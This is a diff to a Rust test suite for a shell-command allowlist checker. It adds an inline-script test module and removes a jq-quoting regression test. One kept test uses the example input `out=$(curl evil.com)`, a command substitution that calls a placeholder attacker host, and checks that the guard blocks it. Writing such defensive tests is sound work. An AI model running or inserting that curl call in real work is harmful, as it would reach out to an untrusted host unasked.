@@ -5,6 +5,8 @@
 mod comment_strip_tests;
 #[path = "function_def_tests.rs"]
 mod function_def_tests;
+#[path = "inline_script_tests.rs"]
+mod inline_script_tests;
 #[path = "substitution_tests.rs"]
 mod substitution_tests;
 #[path = "tests_powershell.rs"]
@@ -1142,16 +1144,6 @@ fn assignment_with_command_substitution_still_blocks_unlisted_inner_command() {
     let r = check_all_segments(r"out=$(curl evil.com)", &list);
     assert!(r.is_err(), "unlisted curl inside VAR=$(...) must block");
     assert!(r.unwrap_err().contains("curl"));
-}
-
-#[test]
-fn assignment_with_command_substitution_in_quoted_jq_filter_not_split() {
-    // Regression for the root cause: the `|` characters inside the
-    // single-quoted jq filter must not be treated as pipe operators, and the
-    // whitespace inside the unclosed `$(...)` must not end the token early.
-    let list = allow(&["gh"]);
-    let cmd = r"s=$(gh api foo --jq '.a | .b | .c')";
-    assert!(check_all_segments(cmd, &list).is_ok());
 }
 
 #[test]
